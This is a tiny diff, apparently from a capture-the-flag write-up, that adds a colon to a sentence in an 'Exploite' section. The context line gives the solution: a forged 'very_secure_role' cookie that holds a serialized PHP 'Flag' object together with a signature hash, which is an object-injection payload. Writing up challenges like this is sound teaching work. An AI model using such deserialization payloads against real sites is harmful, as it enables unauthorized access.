@@ -81,7 +81,7 @@ if (!isset($_COOKIE[$cookieName])) {
   <summary><b>Exploite</b></summary>
 
   ```text
-the cookie value should have the following value
+the cookie value should have the following value:
 very_secure_role=O:4:"Flag":1:{s:6:"action";s:3:"get";}.efa9fbdb0bcb5bdce882e8b156321259663538f57490268f81f43538c99e6640
   ```
 </details>
